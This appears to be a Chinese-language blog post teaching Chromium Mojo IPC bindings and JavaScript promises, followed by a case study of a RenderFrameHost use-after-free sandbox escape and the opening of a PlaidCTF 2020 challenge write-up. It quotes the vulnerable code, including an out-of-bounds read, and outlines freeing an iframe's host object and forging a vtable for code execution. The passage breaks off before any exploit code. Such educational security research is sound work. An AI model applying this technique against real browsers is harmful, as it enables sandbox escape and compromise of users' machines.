<h5 id="Binding-an-InterfaceRequest"><a href="#Binding-an-InterfaceRequest" class="headerlink" title="Binding an InterfaceRequest"></a>Binding an InterfaceRequest</h5><p>mojo.Binding桥接了interface的实现和message pipe的一端，从而将传入的message从server端分派到该实现。<br>在上面的示例中，echoServiceBinding侦听message pipe上的传入的EchoInteger方法调用，并将这些调用分派到EchoImpl实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// |request| could be omitted and passed into bind() later.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Example:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    // FooImpl implements mojom.Foo.</span></span><br><span class="line"><span class="comment">//    function FooImpl() &#123; ... &#125;</span></span><br><span class="line"><span class="comment">//    FooImpl.prototype.fooMethod1 = function() &#123; ... &#125;</span></span><br><span class="line"><span class="comment">//    FooImpl.prototype.fooMethod2 = function() &#123; ... &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    var fooPtr = new mojom.FooPtr();</span></span><br><span class="line"><span class="comment">//    var request = makeRequest(fooPtr);</span></span><br><span class="line"><span class="comment">//    var binding = new Binding(mojom.Foo, new FooImpl(), request);</span></span><br><span class="line"><span class="comment">//    fooPtr.fooMethod1();</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Binding</span>(<span class="params">interfaceType, impl, requestOrHandle</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.interfaceType_ = interfaceType;</span><br><span class="line">  <span class="keyword">this</span>.impl_ = impl;</span><br><span class="line">  <span class="keyword">this</span>.router_ = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>.interfaceEndpointClient_ = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>.stub_ = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (requestOrHandle)</span><br><span class="line">    <span class="keyword">this</span>.bind(requestOrHandle);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">  Binding.prototype.bind = <span class="function"><span class="keyword">function</span>(<span class="params">requestOrHandle</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.close();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> handle = requestOrHandle <span class="keyword">instanceof</span> mojo.InterfaceRequest ?</span><br><span class="line">      requestOrHandle.handle : requestOrHandle;</span><br><span class="line">  <span class="keyword">if</span> (!(handle <span class="keyword">instanceof</span> MojoHandle))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.router_ = <span class="keyword">new</span> internal.Router(handle);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.stub_ = <span class="keyword">new</span> <span class="keyword">this</span>.interfaceType_.stubClass(<span class="keyword">this</span>.impl_);</span><br><span class="line">  <span class="keyword">this</span>.interfaceEndpointClient_ = <span class="keyword">new</span> internal.InterfaceEndpointClient(</span><br><span class="line">      <span class="keyword">this</span>.router_.createLocalEndpointHandle(internal.kPrimaryInterfaceId),</span><br><span class="line">      <span class="keyword">this</span>.stub_, <span class="keyword">this</span>.interfaceType_.kVersion);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.interfaceEndpointClient_ .setPayloadValidators([</span><br><span class="line">      <span class="keyword">this</span>.interfaceType_.validateRequest]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="Receiving-Responses-1"><a href="#Receiving-Responses-1" class="headerlink" title="Receiving Responses"></a>Receiving Responses</h5><p>一些mojom接口期待response，例如EchoInteger，对应的js方法返回一个Promise，当service端发回响应时，此Promise将被resolve，如果interface断开连接，则将被reject。</p>
<h2 id="async和await"><a href="#async和await" class="headerlink" title="async和await"></a>async和await</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolveAfter2Seconds</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      resolve(x);</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="keyword">await</span> resolveAfter2Seconds(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(x); <span class="comment">// 10</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"end"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"sakura"</span>);</span><br><span class="line">&#125;</span><br><span class="line">f1();</span><br><span class="line">f2();</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">sakura</span><br><span class="line"><span class="number">10</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>使用<code>new Promise( function(resolve, reject) {...} /* executor */  );</code>来创建一个Promise对象，其参数executor是带有resolve和reject两个参数的函数 。<br>Promise构造函数执行时立即调用executor函数，resolve和reject两个函数作为参数传递给executor（executor函数在Promise构造函数返回所建promise实例对象前被调用）。resolve和reject函数被调用时，分别将promise的状态改为fulfilled（完成）或rejected（失败）。</p>
<p>如上resolveAfter2Seconds函数返回一个Promise对象，其将立刻调用setTimeout函数，并等待then一个函数，作为它的resolve来执行<br>例如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">resolveAfter2Seconds(<span class="number">10</span>).then(<span class="function">(<span class="params">x</span>)=&gt;</span>&#123;<span class="built_in">console</span>.log(x)&#125;)</span><br><span class="line">...</span><br><span class="line"><span class="comment">//10</span></span><br></pre></td></tr></table></figure>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-17-073550.png" alt=""><br>await可以等待Promise里的executor函数执行结束（<strong>阻塞</strong>），并返回其promise的fulfilled value，其实也就是作为参数传给resolve函数的那个值。<br>另外</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(<span class="string">'foo'</span>)</span><br><span class="line"><span class="comment">// 粗略可以理解成，但注意这并不严格等价，只是在这里可以这么理解</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>)</span>&#123;</span><br><span class="line">  resolve(<span class="string">'foo'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>所以如果<code>let a = await Promise.resolve(&#39;foo&#39;)</code>，则a的值为’foo’</p>
<p>await一般和async一起用，如最前面的例子，只有f1函数里的被阻塞，而不影响f2函数执行，关于异步在这里不再多说，知道这些已经足够，另外一般的写法都是用了箭头函数，这里为了更好理解就改掉了。</p>
<h2 id="case-study-RenderFrameHost-lifetime-cause-sandbox-escape"><a href="#case-study-RenderFrameHost-lifetime-cause-sandbox-escape" class="headerlink" title="case study: RenderFrameHost lifetime cause sandbox escape"></a>case study: RenderFrameHost lifetime cause sandbox escape</h2><p>这里我们通过一个简单的漏洞<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1062091" target="_blank" rel="noopener">issue-1062091</a>来学习chrome的对象生命周期造成的一类安全问题。<br>我们首先看一下造成这个漏洞的mojo接口的定义,在继续往下阅读之前，请仔细的理解前面我写的mojo的基础知识。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Represents a system application related to a particular web app.</span><br><span class="line">&#x2F;&#x2F; See: https:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;appmanifest&#x2F;#dfn-application-object</span><br><span class="line">struct RelatedApplication &#123;</span><br><span class="line">  string platform;</span><br><span class="line">  &#x2F;&#x2F; TODO(mgiuca): Change to url.mojom.Url (requires changing</span><br><span class="line">  &#x2F;&#x2F; WebRelatedApplication as well).</span><br><span class="line">  string? url;</span><br><span class="line">  string? id;</span><br><span class="line">  string? version;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Mojo service for the getInstalledRelatedApps implementation.</span><br><span class="line">&#x2F;&#x2F; The browser process implements this service and receives calls from</span><br><span class="line">&#x2F;&#x2F; renderers to resolve calls to navigator.getInstalledRelatedApps().</span><br><span class="line">interface InstalledAppProvider &#123;</span><br><span class="line">  &#x2F;&#x2F; Filters |relatedApps|, keeping only those which are both installed on the</span><br><span class="line">  &#x2F;&#x2F; user&#39;s system, and related to the web origin of the requesting page.</span><br><span class="line">  &#x2F;&#x2F; Also appends the app version to the filtered apps.</span><br><span class="line">  FilterInstalledApps(array&lt;RelatedApplication&gt; related_apps, url.mojom.Url manifest_url)</span><br><span class="line">      &#x3D;&gt; (array&lt;RelatedApplication&gt; installed_apps);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-17-120341.jpg" alt=""><br>一个render进程里的RenderFrame，对应到browser进程里的一个RenderFrameHost。<br>打开一个新的tab，或者创建一个iframe的时候，都对应创建出一个新的RenderFrameHost对象，而在构造一个新的RenderFrameHost对象的时候，会使用RenderFrameHostImpl来初始化一个BrowserInterfaceBrokerImpl对象。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//content/browser/renderer_host/render_frame_host_impl.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CONTENT_EXPORT</span> <span class="title">RenderFrameHostImpl</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">public</span> RenderFrameHost,</span><br><span class="line">    ...</span><br><span class="line">  <span class="comment">// BrowserInterfaceBroker implementation through which this</span></span><br><span class="line">  <span class="comment">// RenderFrameHostImpl exposes document-scoped Mojo services to the currently</span></span><br><span class="line">  <span class="comment">// active document in the corresponding RenderFrame.</span></span><br><span class="line">  BrowserInterfaceBrokerImpl&lt;RenderFrameHostImpl, RenderFrameHost*&gt; broker_&#123;</span><br><span class="line">      <span class="keyword">this</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>broker可以用来在render和browser之间通信，其bind来自renderer的interfaces requested到具体的mojo interface impl上，依据不同的ExecutionContextHost，最终调用的PopulateBinderMap不同，这里是使用的renderframehost，关于其他host，以后再深究。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// content's implementation of the BrowserInterfaceBroker interface that binds</span></span><br><span class="line"><span class="comment">// interfaces requested by the renderer. Every execution context type (frame,</span></span><br><span class="line"><span class="comment">// worker etc) owns an instance and registers appropriate handlers (see</span></span><br><span class="line"><span class="comment">// internal::PopulateBinderMap).</span></span><br><span class="line"><span class="comment">// Note: this mechanism will eventually replace the usage of InterfaceProvider</span></span><br><span class="line"><span class="comment">// and browser manifests, as well as DocumentInterfaceBroker.</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> ExecutionContextHost, <span class="keyword">typename</span> InterfaceBinderContext&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BrowserInterfaceBrokerImpl</span> :</span> <span class="keyword">public</span> <span class="built_in">blink</span>::mojom::BrowserInterfaceBroker &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  BrowserInterfaceBrokerImpl(ExecutionContextHost* host) : host_(host) &#123;</span><br><span class="line">    internal::PopulateBinderMap(host, &amp;binder_map_);</span><br><span class="line">    internal::PopulateBinderMapWithContext(host, &amp;binder_map_with_context_);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-17-120828.png" alt=""><br>通过<code>map-&gt;Add</code>来向broker里注册适当的handlers回调，由于RenderFrameHostImpl里保存一个BrowserInterfaceBroker的实例，所以当此实现收到来自render的GetInterface方法调用时，它将调用这个回调，例如当通过bindinterface来请求调用一个interface的时候，</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PopulateFrameBinders</span><span class="params">(RenderFrameHostImpl* host,</span></span></span><br><span class="line"><span class="function"><span class="params">                          service_manager::BinderMap* <span class="built_in">map</span>)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">map</span>-&gt;Add&lt;<span class="built_in">blink</span>::mojom::InstalledAppProvider&gt;(</span><br><span class="line">      base::BindRepeating(&amp;RenderFrameHostImpl::CreateInstalledAppProvider,</span><br><span class="line">                          base::Unretained(host)));</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看一下mojo接口的定义<br>所以最终从mojo调到的注册函数如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RenderFrameHostImpl::CreateInstalledAppProvider</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;<span class="built_in">blink</span>::mojom::InstalledAppProvider&gt; receiver)</span> </span>&#123;</span><br><span class="line">  InstalledAppProviderImpl::Create(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstalledAppProviderImpl::Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    RenderFrameHost* host,</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;<span class="built_in">blink</span>::mojom::InstalledAppProvider&gt; receiver)</span> </span>&#123;</span><br><span class="line">  mojo::MakeSelfOwnedReceiver(<span class="built_in">std</span>::make_unique&lt;InstalledAppProviderImpl&gt;(host),</span><br><span class="line">                              <span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数是RenderFrameHost和一个receiver,这里通过MakeSelfOwnedReceiver函数来创建一个self-owned的receiver，其作为一个独立的object存在，它拥有一个std::unique_ptr指向其绑定的interface implemention，并且在MessagePipe被关闭或者发生一些错误时，负责任的去delete implemention，所以其将一个interface implemention和MessagePipe绑定到了一起，具体实现参考<a href="https://source.chromium.org/chromium/chromium/src/+/master:mojo/public/cpp/bindings/self_owned_receiver.h" target="_blank" rel="noopener">这里</a>。</p>
<p><strong>这里我们只要知道InstalledAppProviderImpl和message pipe的生命周期绑定即可，只要message pipe还连接，其就一直存在</strong></p>
<p>另外InstalledAppProviderImpl里保存一个<code>render_frame_host_</code>对象，其来自传入的<code>render_frame_host</code>指针，但是<strong>并没有通过任何方法来将InstalledAppProviderImpl和RenderFrameHost的生命周期绑定</strong>，一般来说会通过将Impl继承自WebObserver等来观察renderframehost的生命周期，当renderframehost析构的时候会通知Impl做出正确的处理，但这里没有。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">InstalledAppProviderImpl::InstalledAppProviderImpl(</span><br><span class="line">    RenderFrameHost* render_frame_host)</span><br><span class="line">    : render_frame_host_(render_frame_host) &#123;</span><br><span class="line">  DCHECK(render_frame_host_);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstalledAppProviderImpl::FilterInstalledApps</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">blink</span>::mojom::RelatedApplicationPtr&gt; related_apps,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> GURL&amp; manifest_url,</span></span></span><br><span class="line"><span class="function"><span class="params">    FilterInstalledAppsCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (render_frame_host_-&gt;GetProcess()-&gt;GetBrowserContext()-&gt;IsOffTheRecord()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">blink</span>::mojom::RelatedApplicationPtr&gt;());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以我们可以通过free iframe来释放掉对应的render_frame_host，而此时InstalledAppProviderImpl的实例依然存在，再通过FilterInstalledApps来再次use <code>render_frame_host_</code>,而<code>render_frame_host_-&gt;GetProcess()</code>是一个虚函数调用，通过占位render_frame_host来伪造虚函数表，我们就可以任意代码执行。</p>
<h2 id="plaidctf2020-mojo-writeup"><a href="#plaidctf2020-mojo-writeup" class="headerlink" title="plaidctf2020 mojo writeup"></a>plaidctf2020 mojo writeup</h2><h3 id="root-cause-analysis"><a href="#root-cause-analysis" class="headerlink" title="root cause analysis"></a>root cause analysis</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    RenderFrameHost *render_frame_host,</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;<span class="built_in">blink</span>::mojom::PlaidStore&gt; receiver)</span> </span>&#123;</span><br><span class="line">  mojo::MakeSelfOwnedReceiver(<span class="built_in">std</span>::make_unique&lt;PlaidStoreImpl&gt;(render_frame_host),<span class="comment">// note lifetime</span></span><br><span class="line">                              <span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br><span class="line">..</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlaidStoreImpl</span> :</span> <span class="keyword">public</span> <span class="built_in">blink</span>::mojom::PlaidStore &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">PlaidStoreImpl</span><span class="params">(RenderFrameHost *render_frame_host)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      RenderFrameHost* render_frame_host,</span></span></span><br><span class="line"><span class="function"><span class="params">      mojo::PendingReceiver&lt;<span class="built_in">blink</span>::mojom::PlaidStore&gt; receiver)</span></span>;</span><br><span class="line"></span><br><span class="line">  ~PlaidStoreImpl() <span class="keyword">override</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PlaidStore overrides:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; &amp;data)</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">      GetDataCallback callback)</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  RenderFrameHost* render_frame_host_;<span class="comment">//----&gt; can free</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; &gt; data_store_;</span><br><span class="line">&#125;;</span><br><span class="line">..</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; &amp;data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive()) &#123; <span class="comment">// use</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  data_store_[key] = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">    GetDataCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive()) &#123; <span class="comment">// use</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> it = data_store_.<span class="built_in">find</span>(key);</span><br><span class="line">  <span class="keyword">if</span> (it == data_store_.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; <span class="title">result</span><span class="params">(it-&gt;second.<span class="built_in">begin</span>(), it-&gt;second.<span class="built_in">begin</span>() + count)</span></span>;<span class="comment">//oob</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface PlaidStore &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Stores data in the data store</span><br><span class="line">  StoreData(string key, array&lt;uint8&gt; data);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Gets data from the data store</span><br><span class="line">  GetData(string key, uint32 count) &#x3D;&gt; (array&lt;uint8&gt; data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个题目里有两个漏洞</p>
<ul>
<li>UAF</li>
</ul>
<p>这个题目里的UAF和我们上面分析的那个case如出一辙，都是同样的生命周期管理的问题，由于MakeSelfOwnedReceiver将PlaidStoreImpl实例和message pipe关联在一起，只要不断开则PlaidStoreImpl实例不会被析构。</p>
<p>而PlaidStoreImpl类保存了指向其所在render_frame_host的raw pointer，即<code>render_frame_host_</code>，但是并没有将它们的生命周期绑定，即render_frame_host被析构，但PlaidStoreImpl实例仍然可以存在。</p>
<p>于是就可以通过在主frame里创建一个child iframe，然后在child iframe里将message pipe的remote端传给父frame，然后将child iframe从dom里移除，从而析构掉child iframe其对应的render_frame_host，但由于message pipe被传给了父frame，因此不会被断开，而此时render_frame_host已经被析构掉了。</p>
<p>所以我们可以通过父frame来通过child iframe里传过来的message pipe的remote端，来调用其StoreData/GetData触发UAF。</p>
<ul>
